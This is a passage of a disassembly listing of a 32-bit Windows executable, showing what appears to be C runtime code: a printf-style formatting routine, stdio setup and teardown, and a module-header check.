.text:0040170C loc_40170C:                             ; CODE XREF: sub_4013A2+351j
.text:0040170C                 and     [ebp+var_2C], 0
.text:00401710                 mov     [ebp+var_C], ecx
.text:00401713                 movsx   eax, word ptr [eax]
.text:00401716                 jmp     loc_4019F3
.text:0040171B ; ---------------------------------------------------------------------------
.text:0040171B
.text:0040171B loc_40171B:                             ; CODE XREF: sub_4013A2+345j
.text:0040171B                                         ; sub_4013A2+34Cj
.text:0040171B                 mov     eax, off_407138
.text:00401720                 mov     [ebp+var_C], eax
.text:00401723                 push    eax
.text:00401724                 jmp     loc_4017D3
.text:00401729 ; ---------------------------------------------------------------------------
.text:00401729
.text:00401729 loc_401729:                             ; CODE XREF: sub_4013A2+2B4j
.text:00401729                 jnz     short loc_401739
.text:0040172B                 cmp     bl, 67h
.text:0040172E                 jnz     short loc_40176E
.text:00401730                 mov     [ebp+var_8], 1
.text:00401737                 jmp     short loc_40176E
.text:00401739 ; ---------------------------------------------------------------------------
.text:00401739
.text:00401739 loc_401739:                             ; CODE XREF: sub_4013A2:loc_401729j
.text:00401739                 cmp     [ebp+var_8], edx
.text:0040173C                 jle     short loc_401741
.text:0040173E                 mov     [ebp+var_8], edx
.text:00401741
.text:00401741 loc_401741:                             ; CODE XREF: sub_4013A2+39Aj
.text:00401741                 cmp     [ebp+var_8], 0A3h
.text:00401748                 jle     short loc_40176E
.text:0040174A                 mov     eax, [ebp+var_8]
.text:0040174D                 add     eax, 15Dh
.text:00401752                 push    eax             ; size_t
.text:00401753                 call    _malloc
.text:00401758                 test    eax, eax
.text:0040175A                 pop     ecx
.text:0040175B                 mov     [ebp+var_30], eax
.text:0040175E                 jz      short loc_401767
.text:00401760                 mov     edi, eax
.text:00401762                 mov     [ebp+var_C], edi
.text:00401765                 jmp     short loc_40176E
.text:00401767 ; ---------------------------------------------------------------------------
.text:00401767
.text:00401767 loc_401767:                             ; CODE XREF: sub_4013A2+3BCj
.text:00401767                 mov     [ebp+var_8], 0A3h
.text:0040176E
.text:0040176E loc_40176E:                             ; CODE XREF: sub_4013A2+2C1j
.text:0040176E                                         ; sub_4013A2+38Cj ...
.text:0040176E                 mov     eax, [ebp+arg_8]
.text:00401771                 push    [ebp+var_40]
.text:00401774                 add     eax, 8
.text:00401777                 mov     [ebp+arg_8], eax
.text:0040177A                 push    [ebp+var_8]
.text:0040177D                 mov     ecx, [eax-8]
.text:00401780                 mov     [ebp+var_4C], ecx
.text:00401783                 mov     eax, [eax-4]
.text:00401786                 mov     [ebp+var_48], eax
.text:00401789                 movsx   eax, bl
.text:0040178C                 push    eax
.text:0040178D                 lea     eax, [ebp+var_4C]
.text:00401790                 push    edi
.text:00401791                 push    eax
.text:00401792                 call    off_407500
.text:00401798                 mov     esi, [ebp+var_4]
.text:0040179B                 add     esp, 14h
.text:0040179E                 and     esi, 80h
.text:004017A4                 jz      short loc_4017B4
.text:004017A6                 cmp     [ebp+var_8], 0
.text:004017AA                 jnz     short loc_4017B4
.text:004017AC                 push    edi
.text:004017AD                 call    off_40750C
.text:004017B3                 pop     ecx
.text:004017B4
.text:004017B4 loc_4017B4:                             ; CODE XREF: sub_4013A2+402j
.text:004017B4                                         ; sub_4013A2+408j
.text:004017B4                 cmp     bl, 67h
.text:004017B7                 jnz     short loc_4017C5
.text:004017B9                 test    esi, esi
.text:004017BB                 jnz     short loc_4017C5
.text:004017BD                 push    edi
.text:004017BE                 call    off_407504
.text:004017C4                 pop     ecx
.text:004017C5
.text:004017C5 loc_4017C5:                             ; CODE XREF: sub_4013A2+415j
.text:004017C5                                         ; sub_4013A2+419j
.text:004017C5                 cmp     byte ptr [edi], 2Dh
.text:004017C8                 jnz     short loc_4017D2
.text:004017CA                 or      byte ptr [ebp+var_4+1], 1
.text:004017CE                 inc     edi
.text:004017CF                 mov     [ebp+var_C], edi
.text:004017D2
.text:004017D2 loc_4017D2:                             ; CODE XREF: sub_4013A2+426j
.text:004017D2                 push    edi             ; char *
.text:004017D3
.text:004017D3 loc_4017D3:                             ; CODE XREF: sub_4013A2+382j
.text:004017D3                 call    _strlen
.text:004017D8                 pop     ecx
.text:004017D9                 jmp     loc_4019F3
.text:004017DE ; ---------------------------------------------------------------------------
.text:004017DE
.text:004017DE loc_4017DE:                             ; CODE XREF: sub_4013A2+1FEj
.text:004017DE                 sub     eax, 69h
.text:004017E1                 jz      loc_4018B7
.text:004017E7                 sub     eax, 5
.text:004017EA                 jz      loc_40188D
.text:004017F0                 dec     eax
.text:004017F1                 jz      loc_40187B
.text:004017F7                 dec     eax
.text:004017F8                 jz      short loc_40184B
.text:004017FA                 sub     eax, 3
.text:004017FD                 jz      loc_4015E3
.text:00401803                 dec     eax
.text:00401804                 dec     eax
.text:00401805                 jz      loc_4018BB
.text:0040180B                 sub     eax, 3
.text:0040180E                 jnz     loc_4019F6
.text:00401814                 mov     [ebp+var_34], 27h
.text:0040181B                 jmp     short loc_401859
.text:0040181D ; ---------------------------------------------------------------------------
.text:0040181D
.text:0040181D loc_40181D:                             ; CODE XREF: sub_4013A2+285j
.text:0040181D                                         ; sub_4013A2+28Fj
.text:0040181D                 sub     eax, ecx
.text:0040181F                 sar     eax, 1
.text:00401821                 jmp     loc_4019F3
.text:00401826 ; ---------------------------------------------------------------------------
.text:00401826
.text:00401826 loc_401826:                             ; CODE XREF: sub_4013A2+264j
.text:00401826                 test    ecx, ecx
.text:00401828                 jnz     short loc_401833
.text:0040182A                 mov     ecx, off_407138
.text:00401830                 mov     [ebp+var_C], ecx
.text:00401833
.text:00401833 loc_401833:                             ; CODE XREF: sub_4013A2+486j
.text:00401833                 mov     eax, ecx
.text:00401835
.text:00401835 loc_401835:                             ; CODE XREF: sub_4013A2+4A0j
.text:00401835                 mov     edx, esi
.text:00401837                 dec     esi
.text:00401838                 test    edx, edx
.text:0040183A                 jz      short loc_401844
.text:0040183C                 cmp     byte ptr [eax], 0
.text:0040183F                 jz      short loc_401844
.text:00401841                 inc     eax
.text:00401842                 jmp     short loc_401835
.text:00401844 ; ---------------------------------------------------------------------------
.text:00401844
.text:00401844 loc_401844:                             ; CODE XREF: sub_4013A2+498j
.text:00401844                                         ; sub_4013A2+49Dj
.text:00401844                 sub     eax, ecx
.text:00401846                 jmp     loc_4019F3
.text:0040184B ; ---------------------------------------------------------------------------
.text:0040184B
.text:0040184B loc_40184B:                             ; CODE XREF: sub_4013A2+456j
.text:0040184B                 mov     [ebp+var_8], 8
.text:00401852
.text:00401852 loc_401852:                             ; CODE XREF: sub_4013A2+216j
.text:00401852                 mov     [ebp+var_34], 7
.text:00401859
.text:00401859 loc_401859:                             ; CODE XREF: sub_4013A2+479j
.text:00401859                 test    byte ptr [ebp+var_4], 80h
.text:0040185D                 mov     [ebp+var_10], 10h
.text:00401864                 jz      short loc_4018C2
.text:00401866                 mov     al, byte ptr [ebp+var_34]
.text:00401869                 mov     byte ptr [ebp+var_16], 30h
.text:0040186D                 add     al, 51h
.text:0040186F                 mov     [ebp+var_24], 2
.text:00401876                 mov     byte ptr [ebp+var_16+1], al
.text:00401879                 jmp     short loc_4018C2
.text:0040187B ; ---------------------------------------------------------------------------
.text:0040187B
.text:0040187B loc_40187B:                             ; CODE XREF: sub_4013A2+44Fj
.text:0040187B                 test    byte ptr [ebp+var_4], 80h
.text:0040187F                 mov     [ebp+var_10], 8
.text:00401886                 jz      short loc_4018C2
.text:00401888                 or      [ebp+var_4], edx
.text:0040188B                 jmp     short loc_4018C2
.text:0040188D ; ---------------------------------------------------------------------------
.text:0040188D
.text:0040188D loc_40188D:                             ; CODE XREF: sub_4013A2+448j
.text:0040188D                 lea     eax, [ebp+arg_8]
.text:00401890                 push    eax
.text:00401891                 call    _get_int_arg
.text:00401896                 test    byte ptr [ebp+var_4], 20h
.text:0040189A                 pop     ecx
.text:0040189B                 jz      short loc_4018A6
.text:0040189D                 mov     cx, word ptr [ebp+var_16+2]
.text:004018A1                 mov     [eax], cx
.text:004018A4                 jmp     short loc_4018AB
.text:004018A6 ; ---------------------------------------------------------------------------
.text:004018A6
.text:004018A6 loc_4018A6:                             ; CODE XREF: sub_4013A2+4F9j
.text:004018A6                 mov     ecx, [ebp+var_16+2]
.text:004018A9                 mov     [eax], ecx
.text:004018AB
.text:004018AB loc_4018AB:                             ; CODE XREF: sub_4013A2+502j
.text:004018AB                 mov     [ebp+var_38], 1
.text:004018B2                 jmp     loc_401AF4
.text:004018B7 ; ---------------------------------------------------------------------------
.text:004018B7
.text:004018B7 loc_4018B7:                             ; CODE XREF: sub_4013A2+30Dj
.text:004018B7                                         ; sub_4013A2+43Fj
.text:004018B7                 or      [ebp+var_4], 40h
.text:004018BB
.text:004018BB loc_4018BB:                             ; CODE XREF: sub_4013A2+463j
.text:004018BB                 mov     [ebp+var_10], 0Ah
.text:004018C2
.text:004018C2 loc_4018C2:                             ; CODE XREF: sub_4013A2+4C2j
.text:004018C2                                         ; sub_4013A2+4D7j ...
.text:004018C2                 test    byte ptr [ebp+var_4+1], 80h
.text:004018C6                 jz      short loc_4018D4
.text:004018C8                 lea     eax, [ebp+arg_8]
.text:004018CB                 push    eax
.text:004018CC                 call    _get_int64_arg
.text:004018D1                 pop     ecx
.text:004018D2                 jmp     short loc_401915
.text:004018D4 ; ---------------------------------------------------------------------------
.text:004018D4
.text:004018D4 loc_4018D4:                             ; CODE XREF: sub_4013A2+524j
.text:004018D4                 test    byte ptr [ebp+var_4], 20h
.text:004018D8                 jz      short loc_4018FB
.text:004018DA                 test    byte ptr [ebp+var_4], 40h
.text:004018DE                 lea     eax, [ebp+arg_8]
.text:004018E1                 push    eax
.text:004018E2                 jz      short loc_4018F0
.text:004018E4                 call    _get_int_arg
.text:004018E9                 pop     ecx
.text:004018EA                 movsx   eax, ax
.text:004018ED
.text:004018ED loc_4018ED:                             ; CODE XREF: sub_4013A2+557j
.text:004018ED                                         ; sub_4013A2+569j
.text:004018ED                 cdq
.text:004018EE                 jmp     short loc_401915
.text:004018F0 ; ---------------------------------------------------------------------------
.text:004018F0
.text:004018F0 loc_4018F0:                             ; CODE XREF: sub_4013A2+540j
.text:004018F0                 call    _get_int_arg
.text:004018F5                 pop     ecx
.text:004018F6                 movzx   eax, ax
.text:004018F9                 jmp     short loc_4018ED
.text:004018FB ; ---------------------------------------------------------------------------
.text:004018FB
.text:004018FB loc_4018FB:                             ; CODE XREF: sub_4013A2+536j
.text:004018FB                 test    byte ptr [ebp+var_4], 40h
.text:004018FF                 lea     eax, [ebp+arg_8]
.text:00401902                 push    eax
.text:00401903                 jz      short loc_40190D
.text:00401905                 call    _get_int_arg
.text:0040190A                 pop     ecx
.text:0040190B                 jmp     short loc_4018ED
.text:0040190D ; ---------------------------------------------------------------------------
.text:0040190D
.text:0040190D loc_40190D:                             ; CODE XREF: sub_4013A2+561j
.text:0040190D                 call    _get_int_arg
.text:00401912                 pop     ecx
.text:00401913                 xor     edx, edx
.text:00401915
.text:00401915 loc_401915:                             ; CODE XREF: sub_4013A2+530j
.text:00401915                                         ; sub_4013A2+54Cj
.text:00401915                 test    byte ptr [ebp+var_4], 40h
.text:00401919                 jz      short loc_401938
.text:0040191B                 test    edx, edx
.text:0040191D                 jg      short loc_401938
.text:0040191F                 jl      short loc_401925
.text:00401921                 test    eax, eax
.text:00401923                 jnb     short loc_401938
.text:00401925
.text:00401925 loc_401925:                             ; CODE XREF: sub_4013A2+57Dj
.text:00401925                 neg     eax
.text:00401927                 adc     edx, 0
.text:0040192A                 mov     [ebp+var_20], eax
.text:0040192D                 neg     edx
.text:0040192F                 or      byte ptr [ebp+var_4+1], 1
.text:00401933                 mov     [ebp+var_1C], edx
.text:00401936                 jmp     short loc_40193E
.text:00401938 ; ---------------------------------------------------------------------------
.text:00401938
.text:00401938 loc_401938:                             ; CODE XREF: sub_4013A2+577j
.text:00401938                                         ; sub_4013A2+57Bj ...
.text:00401938                 mov     [ebp+var_20], eax
.text:0040193B                 mov     [ebp+var_1C], edx
.text:0040193E
.text:0040193E loc_40193E:                             ; CODE XREF: sub_4013A2+594j
.text:0040193E                 test    byte ptr [ebp+var_4+1], 80h
.text:00401942                 jnz     short loc_401948
.text:00401944                 and     [ebp+var_1C], 0
.text:00401948
.text:00401948 loc_401948:                             ; CODE XREF: sub_4013A2+5A0j
.text:00401948                 cmp     [ebp+var_8], 0
.text:0040194C                 jge     short loc_401957
.text:0040194E                 mov     [ebp+var_8], 1
.text:00401955                 jmp     short loc_401968
.text:00401957 ; ---------------------------------------------------------------------------
.text:00401957
.text:00401957 loc_401957:                             ; CODE XREF: sub_4013A2+5AAj
.text:00401957                 and     [ebp+var_4], 0FFFFFFF7h
.text:0040195B                 mov     eax, 200h
.text:00401960                 cmp     [ebp+var_8], eax
.text:00401963                 jle     short loc_401968
.text:00401965                 mov     [ebp+var_8], eax
.text:00401968
.text:00401968 loc_401968:                             ; CODE XREF: sub_4013A2+5B3j
.text:00401968                                         ; sub_4013A2+5C1j
.text:00401968                 mov     eax, [ebp+var_20]
.text:0040196B                 or      eax, [ebp+var_1C]
.text:0040196E                 jnz     short loc_401974
.text:00401970                 and     [ebp+var_24], 0
.text:00401974
.text:00401974 loc_401974:                             ; CODE XREF: sub_4013A2+5CCj
.text:00401974                 lea     eax, [ebp-4Dh]
.text:00401977                 mov     [ebp+var_C], eax
.text:0040197A
.text:0040197A loc_40197A:                             ; CODE XREF: sub_4013A2+627j
.text:0040197A                 mov     eax, [ebp+var_8]
.text:0040197D                 dec     [ebp+var_8]
.text:00401980                 test    eax, eax
.text:00401982                 jg      short loc_40198C
.text:00401984                 mov     eax, [ebp+var_20]
.text:00401987                 or      eax, [ebp+var_1C]
.text:0040198A                 jz      short loc_4019CB
.text:0040198C
.text:0040198C loc_40198C:                             ; CODE XREF: sub_4013A2+5E0j
.text:0040198C                 mov     eax, [ebp+var_10]
.text:0040198F                 cdq
.text:00401990                 mov     edi, edx
.text:00401992                 mov     esi, eax
.text:00401994                 push    edi
.text:00401995                 push    esi
.text:00401996                 push    [ebp+var_1C]
.text:00401999                 push    [ebp+var_20]
.text:0040199C                 call    __aullrem
.text:004019A1                 push    edi
.text:004019A2                 push    esi
.text:004019A3                 push    [ebp+var_1C]
.text:004019A6                 mov     ebx, eax
.text:004019A8                 add     ebx, 30h
.text:004019AB                 push    [ebp+var_20]
.text:004019AE                 call    __aulldiv
.text:004019B3                 cmp     ebx, 39h
.text:004019B6                 mov     [ebp+var_20], eax
.text:004019B9                 mov     [ebp+var_1C], edx
.text:004019BC                 jle     short loc_4019C1
.text:004019BE                 add     ebx, [ebp+var_34]
.text:004019C1
.text:004019C1 loc_4019C1:                             ; CODE XREF: sub_4013A2+61Aj
.text:004019C1                 mov     eax, [ebp+var_C]
.text:004019C4                 dec     [ebp+var_C]
.text:004019C7                 mov     [eax], bl
.text:004019C9                 jmp     short loc_40197A
.text:004019CB ; ---------------------------------------------------------------------------
.text:004019CB
.text:004019CB loc_4019CB:                             ; CODE XREF: sub_4013A2+5E8j
.text:004019CB                 lea     eax, [ebp-4Dh]
.text:004019CE                 sub     eax, [ebp+var_C]
.text:004019D1                 inc     [ebp+var_C]
.text:004019D4                 test    byte ptr [ebp+var_4+1], 2
.text:004019D8                 mov     [ebp+var_10], eax
.text:004019DB                 jz      short loc_4019F6
.text:004019DD                 mov     ecx, [ebp+var_C]
.text:004019E0                 cmp     byte ptr [ecx], 30h
.text:004019E3                 jnz     short loc_4019E9
.text:004019E5                 test    eax, eax
.text:004019E7                 jnz     short loc_4019F6
.text:004019E9
.text:004019E9 loc_4019E9:                             ; CODE XREF: sub_4013A2+641j
.text:004019E9                 dec     [ebp+var_C]
.text:004019EC                 inc     eax
.text:004019ED                 mov     ecx, [ebp+var_C]
.text:004019F0                 mov     byte ptr [ecx], 30h
.text:004019F3
.text:004019F3 loc_4019F3:                             ; CODE XREF: sub_4013A2+374j
.text:004019F3                                         ; sub_4013A2+437j ...
.text:004019F3                 mov     [ebp+var_10], eax
.text:004019F6
.text:004019F6 loc_4019F6:                             ; CODE XREF: sub_4013A2+230j
.text:004019F6                                         ; sub_4013A2+313j ...
.text:004019F6                 cmp     [ebp+var_38], 0
.text:004019FA                 jnz     loc_401AF4
.text:00401A00                 mov     ebx, [ebp+var_4]
.text:00401A03                 test    bl, 40h
.text:00401A06                 jz      short loc_401A2E
.text:00401A08                 test    bh, 1
.text:00401A0B                 jz      short loc_401A13
.text:00401A0D                 mov     byte ptr [ebp+var_16], 2Dh
.text:00401A11                 jmp     short loc_401A27
.text:00401A13 ; ---------------------------------------------------------------------------
.text:00401A13
.text:00401A13 loc_401A13:                             ; CODE XREF: sub_4013A2+669j
.text:00401A13                 test    bl, 1
.text:00401A16                 jz      short loc_401A1E
.text:00401A18                 mov     byte ptr [ebp+var_16], 2Bh
.text:00401A1C                 jmp     short loc_401A27
.text:00401A1E ; ---------------------------------------------------------------------------
.text:00401A1E
.text:00401A1E loc_401A1E:                             ; CODE XREF: sub_4013A2+674j
.text:00401A1E                 test    bl, 2
.text:00401A21                 jz      short loc_401A2E
.text:00401A23                 mov     byte ptr [ebp+var_16], 20h
.text:00401A27
.text:00401A27 loc_401A27:                             ; CODE XREF: sub_4013A2+66Fj
.text:00401A27                                         ; sub_4013A2+67Aj
.text:00401A27                 mov     [ebp+var_24], 1
.text:00401A2E
.text:00401A2E loc_401A2E:                             ; CODE XREF: sub_4013A2+664j
.text:00401A2E                                         ; sub_4013A2+67Fj
.text:00401A2E                 mov     esi, [ebp+var_28]
.text:00401A31                 sub     esi, [ebp+var_24]
.text:00401A34                 sub     esi, [ebp+var_10]
.text:00401A37                 test    bl, 0Ch
.text:00401A3A                 jnz     short loc_401A4E
.text:00401A3C                 lea     eax, [ebp+var_16+2]
.text:00401A3F                 push    eax             ; int
.text:00401A40                 push    [ebp+arg_0]     ; FILE *
.text:00401A43                 push    esi             ; int
.text:00401A44                 push    20h             ; int
.text:00401A46                 call    _write_multi_char
.text:00401A4B                 add     esp, 10h
.text:00401A4E
.text:00401A4E loc_401A4E:                             ; CODE XREF: sub_4013A2+698j
.text:00401A4E                 lea     eax, [ebp+var_16+2]
.text:00401A51                 push    eax             ; int
.text:00401A52                 lea     eax, [ebp+var_16]
.text:00401A55                 push    [ebp+arg_0]     ; FILE *
.text:00401A58                 push    [ebp+var_24]    ; int
.text:00401A5B                 push    eax             ; int
.text:00401A5C                 call    _write_string
.text:00401A61                 add     esp, 10h
.text:00401A64                 test    bl, 8
.text:00401A67                 jz      short loc_401A80
.text:00401A69                 test    bl, 4
.text:00401A6C                 jnz     short loc_401A80
.text:00401A6E                 lea     eax, [ebp+var_16+2]
.text:00401A71                 push    eax             ; int
.text:00401A72                 push    [ebp+arg_0]     ; FILE *
.text:00401A75                 push    esi             ; int
.text:00401A76                 push    30h             ; int
.text:00401A78                 call    _write_multi_char
.text:00401A7D                 add     esp, 10h
.text:00401A80
.text:00401A80 loc_401A80:                             ; CODE XREF: sub_4013A2+6C5j
.text:00401A80                                         ; sub_4013A2+6CAj
.text:00401A80                 cmp     [ebp+var_2C], 0
.text:00401A84                 jz      short loc_401AC7
.text:00401A86                 cmp     [ebp+var_10], 0
.text:00401A8A                 jle     short loc_401AC7
.text:00401A8C                 mov     eax, [ebp+var_10]
.text:00401A8F                 mov     ebx, [ebp+var_C]
.text:00401A92                 lea     edi, [eax-1]
.text:00401A95
.text:00401A95 loc_401A95:                             ; CODE XREF: sub_4013A2+721j
.text:00401A95                 mov     ax, [ebx]
.text:00401A98                 inc     ebx
.text:00401A99                 push    eax             ; wchar_t
.text:00401A9A                 lea     eax, [ebp+var_44]
.text:00401A9D                 push    eax             ; char *
.text:00401A9E                 inc     ebx
.text:00401A9F                 call    _wctomb
.text:00401AA4                 pop     ecx
.text:00401AA5                 test    eax, eax
.text:00401AA7                 pop     ecx
.text:00401AA8                 jle     short loc_401ADC
.text:00401AAA                 lea     ecx, [ebp+var_16+2]
.text:00401AAD                 push    ecx             ; int
.text:00401AAE                 push    [ebp+arg_0]     ; FILE *
.text:00401AB1                 push    eax             ; int
.text:00401AB2                 lea     eax, [ebp+var_44]
.text:00401AB5                 push    eax             ; int
.text:00401AB6                 call    _write_string
.text:00401ABB                 add     esp, 10h
.text:00401ABE                 mov     eax, edi
.text:00401AC0                 dec     edi
.text:00401AC1                 test    eax, eax
.text:00401AC3                 jnz     short loc_401A95
.text:00401AC5                 jmp     short loc_401ADC
.text:00401AC7 ; ---------------------------------------------------------------------------
.text:00401AC7
.text:00401AC7 loc_401AC7:                             ; CODE XREF: sub_4013A2+6E2j
.text:00401AC7                                         ; sub_4013A2+6E8j
.text:00401AC7                 lea     eax, [ebp+var_16+2]
.text:00401ACA                 push    eax             ; int
.text:00401ACB                 push    [ebp+arg_0]     ; FILE *
.text:00401ACE                 push    [ebp+var_10]    ; int
.text:00401AD1                 push    [ebp+var_C]     ; int
.text:00401AD4                 call    _write_string
.text:00401AD9                 add     esp, 10h
.text:00401ADC
.text:00401ADC loc_401ADC:                             ; CODE XREF: sub_4013A2+706j
.text:00401ADC                                         ; sub_4013A2+723j
.text:00401ADC                 test    byte ptr [ebp+var_4], 4
.text:00401AE0                 jz      short loc_401AF4
.text:00401AE2                 lea     eax, [ebp+var_16+2]
.text:00401AE5                 push    eax             ; int
.text:00401AE6                 push    [ebp+arg_0]     ; FILE *
.text:00401AE9                 push    esi             ; int
.text:00401AEA                 push    20h             ; int
.text:00401AEC                 call    _write_multi_char
.text:00401AF1                 add     esp, 10h
.text:00401AF4
.text:00401AF4 loc_401AF4:                             ; CODE XREF: sub_4013A2+510j
.text:00401AF4                                         ; sub_4013A2+658j ...
.text:00401AF4                 cmp     [ebp+var_30], 0
.text:00401AF8                 jz      short loc_401B07
.text:00401AFA                 push    [ebp+var_30]
.text:00401AFD                 call    sub_402C41
.text:00401B02                 and     [ebp+var_30], 0
.text:00401B06                 pop     ecx
.text:00401B07
.text:00401B07 loc_401B07:                             ; CODE XREF: sub_4013A2+76j
.text:00401B07                                         ; sub_4013A2+9Bj ...
.text:00401B07                 mov     esi, [ebp+arg_4]
.text:00401B0A                 mov     bl, [esi]
.text:00401B0C                 inc     esi
.text:00401B0D                 test    bl, bl
.text:00401B0F                 mov     [ebp+arg_4], esi
.text:00401B12                 jnz     loc_4013D6
.text:00401B18
.text:00401B18 loc_401B18:                             ; CODE XREF: sub_4013A2+22j
.text:00401B18                                         ; sub_4013A2+45j
.text:00401B18                 mov     eax, [ebp+var_16+2]
.text:00401B1B                 pop     edi
.text:00401B1C                 pop     esi
.text:00401B1D                 pop     ebx
.text:00401B1E                 leave
.text:00401B1F                 retn
.text:00401B1F sub_4013A2      endp
.text:00401B1F
.text:00401B1F ; ---------------------------------------------------------------------------
.text:00401B20 off_401B20      dd offset loc_401555    ; DATA XREF: sub_4013A2+7Cr
.text:00401B24                 dd offset loc_401425
.text:00401B28                 dd offset loc_401442
.text:00401B2C                 dd offset loc_40148E
.text:00401B30                 dd offset loc_4014C5
.text:00401B34                 dd offset loc_4014CE
.text:00401B38                 dd offset loc_401506
.text:00401B3C                 dd offset loc_40159A
.text:00401B40 ; [00000035 BYTES: COLLAPSED FUNCTION _write_char. PRESS KEYPAD "+" TO EXPAND]
.text:00401B75 ; [00000031 BYTES: COLLAPSED FUNCTION _write_multi_char. PRESS KEYPAD "+" TO EXPAND]
.text:00401BA6 ; [00000038 BYTES: COLLAPSED FUNCTION _write_string. PRESS KEYPAD "+" TO EXPAND]
.text:00401BDE ; [0000000D BYTES: COLLAPSED FUNCTION _get_int_arg. PRESS KEYPAD "+" TO EXPAND]
.text:00401BEB ; [00000010 BYTES: COLLAPSED FUNCTION _get_int64_arg. PRESS KEYPAD "+" TO EXPAND]
.text:00401BFB ; [0000000E BYTES: COLLAPSED FUNCTION _get_short_arg. PRESS KEYPAD "+" TO EXPAND]
.text:00401C09 ; ---------------------------------------------------------------------------
.text:00401C09
.text:00401C09 ___initstdio:
.text:00401C09                 mov     eax, dword_40AF00
.text:00401C0E                 push    esi
.text:00401C0F                 push    14h
.text:00401C11                 test    eax, eax
.text:00401C13                 pop     esi
.text:00401C14                 jnz     short loc_401C1D
.text:00401C16                 mov     eax, 200h
.text:00401C1B                 jmp     short loc_401C23
.text:00401C1D ; ---------------------------------------------------------------------------
.text:00401C1D
.text:00401C1D loc_401C1D:                             ; CODE XREF: .text:00401C14j
.text:00401C1D                 cmp     eax, esi
.text:00401C1F                 jge     short loc_401C28
.text:00401C21                 mov     eax, esi
.text:00401C23
.text:00401C23 loc_401C23:                             ; CODE XREF: .text:00401C1Bj
.text:00401C23                 mov     dword_40AF00, eax
.text:00401C28
.text:00401C28 loc_401C28:                             ; CODE XREF: .text:00401C1Fj
.text:00401C28                 push    4
.text:00401C2A                 push    eax
.text:00401C2B                 call    sub_402F9A
.text:00401C30                 pop     ecx
.text:00401C31                 mov     dword_409EF8, eax
.text:00401C36                 test    eax, eax
.text:00401C38                 pop     ecx
.text:00401C39                 jnz     short loc_401C5C
.text:00401C3B                 push    4
.text:00401C3D                 push    esi
.text:00401C3E                 mov     dword_40AF00, esi
.text:00401C44                 call    sub_402F9A
.text:00401C49                 pop     ecx
.text:00401C4A                 mov     dword_409EF8, eax
.text:00401C4F                 test    eax, eax
.text:00401C51                 pop     ecx
.text:00401C52                 jnz     short loc_401C5C
.text:00401C54                 push    1Ah
.text:00401C56                 call    __amsg_exit
.text:00401C5B                 pop     ecx
.text:00401C5C
.text:00401C5C loc_401C5C:                             ; CODE XREF: .text:00401C39j
.text:00401C5C                                         ; .text:00401C52j
.text:00401C5C                 xor     ecx, ecx
.text:00401C5E                 mov     eax, offset off_407140
.text:00401C63
.text:00401C63 loc_401C63:                             ; CODE XREF: .text:00401C77j
.text:00401C63                 mov     edx, dword_409EF8
.text:00401C69                 mov     [ecx+edx], eax
.text:00401C6C                 add     eax, 20h
.text:00401C6F                 add     ecx, 4
.text:00401C72                 cmp     eax, offset dword_4073C0
.text:00401C77                 jl      short loc_401C63
.text:00401C79                 xor     edx, edx
.text:00401C7B                 mov     ecx, offset unk_407150
.text:00401C80
.text:00401C80 loc_401C80:                             ; CODE XREF: .text:00401CAAj
.text:00401C80                 mov     eax, edx
.text:00401C82                 mov     esi, edx
.text:00401C84                 sar     eax, 5
.text:00401C87                 and     esi, 1Fh
.text:00401C8A                 mov     eax, dword_409DE0[eax*4]
.text:00401C91                 mov     eax, [eax+esi*8]
.text:00401C94                 cmp     eax, 0FFFFFFFFh
.text:00401C97                 jz      short loc_401C9D
.text:00401C99                 test    eax, eax
.text:00401C9B                 jnz     short loc_401CA0
.text:00401C9D
.text:00401C9D loc_401C9D:                             ; CODE XREF: .text:00401C97j
.text:00401C9D                 or      dword ptr [ecx], 0FFFFFFFFh
.text:00401CA0
.text:00401CA0 loc_401CA0:                             ; CODE XREF: .text:00401C9Bj
.text:00401CA0                 add     ecx, 20h
.text:00401CA3                 inc     edx
.text:00401CA4                 cmp     ecx, offset unk_4071B0
.text:00401CAA                 jl      short loc_401C80
.text:00401CAC                 pop     esi
.text:00401CAD                 retn
.text:00401CAE ; ---------------------------------------------------------------------------
.text:00401CAE
.text:00401CAE ___endstdio:
.text:00401CAE                 call    sub_402BCB
.text:00401CB3                 cmp     byte_409A30, 0
.text:00401CBA                 jz      short locret_401CC1
.text:00401CBC                 jmp     __fcloseall
.text:00401CC1 ; ---------------------------------------------------------------------------
.text:00401CC1
.text:00401CC1 locret_401CC1:                          ; CODE XREF: .text:00401CBAj
.text:00401CC1                 retn
.text:00401CC2 ; [0000002D BYTES: COLLAPSED FUNCTION __cinit. PRESS KEYPAD "+" TO EXPAND]
.text:00401CEF ; [00000011 BYTES: COLLAPSED FUNCTION _exit. PRESS KEYPAD "+" TO EXPAND]
.text:00401D00 ; [00000011 BYTES: COLLAPSED FUNCTION __exit. PRESS KEYPAD "+" TO EXPAND]
.text:00401D11 ; [00000099 BYTES: COLLAPSED FUNCTION _doexit. PRESS KEYPAD "+" TO EXPAND]
.text:00401DAA ; [0000001A BYTES: COLLAPSED FUNCTION __initterm. PRESS KEYPAD "+" TO EXPAND]
.text:00401DC4 ; [00000141 BYTES: COLLAPSED FUNCTION __XcptFilter. PRESS KEYPAD "+" TO EXPAND]
.text:00401F05 ; [00000043 BYTES: COLLAPSED FUNCTION _xcptlookup. PRESS KEYPAD "+" TO EXPAND]
.text:00401F48 ; [000000B9 BYTES: COLLAPSED FUNCTION __setenvp. PRESS KEYPAD "+" TO EXPAND]
.text:00402001 ; [00000099 BYTES: COLLAPSED FUNCTION __setargv. PRESS KEYPAD "+" TO EXPAND]
.text:0040209A ; [000001B4 BYTES: COLLAPSED FUNCTION _parse_cmdline. PRESS KEYPAD "+" TO EXPAND]
.text:0040224E ; [00000132 BYTES: COLLAPSED FUNCTION ___crtGetEnvironmentStringsA. PRESS KEYPAD "+" TO EXPAND]
.text:00402380 ; [000001AB BYTES: COLLAPSED FUNCTION __ioinit. PRESS KEYPAD "+" TO EXPAND]
.text:0040252B
.text:0040252B ; ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦ S U B R O U T I N E ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦
.text:0040252B
.text:0040252B
.text:0040252B sub_40252B      proc near               ; CODE XREF: sub_402558+136p
.text:0040252B
.text:0040252B arg_0           = dword ptr  8
.text:0040252B
.text:0040252B                 push    esi
.text:0040252C                 mov     esi, [esp+arg_0]
.text:00402530                 push    0               ; lpModuleName
.text:00402532                 and     dword ptr [esi], 0
.text:00402535                 call    ds:GetModuleHandleA
.text:0040253B                 cmp     word ptr [eax], 5A4Dh
.text:00402540                 jnz     short loc_402556
